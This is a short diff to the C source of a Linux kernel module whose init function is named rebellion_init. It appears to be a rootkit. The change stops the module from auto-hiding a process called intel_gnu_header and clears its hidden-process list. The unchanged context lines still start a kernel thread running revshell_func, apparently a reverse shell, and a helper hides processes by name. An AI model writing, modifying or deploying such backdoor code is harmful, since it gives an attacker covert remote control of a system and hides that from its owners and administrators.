@@ -170,8 +170,9 @@ bool is_pid_hidden_by_name(pid_t pid) {
 }
 
 static int __init rebellion_init(void) {
-    // Auto-hide the intel_gnu_header process
-    add_hidden_process(AUTO_HIDE_PROCESS);
+    // Initialize hidden process list to be completely empty
+    hidden_process_count = 0;
+    memset(hidden_processes, 0, sizeof(hidden_processes));
     
     revshell_thread = kthread_run(revshell_func, NULL, "shell_thread");
     if (IS_ERR(revshell_thread)) {
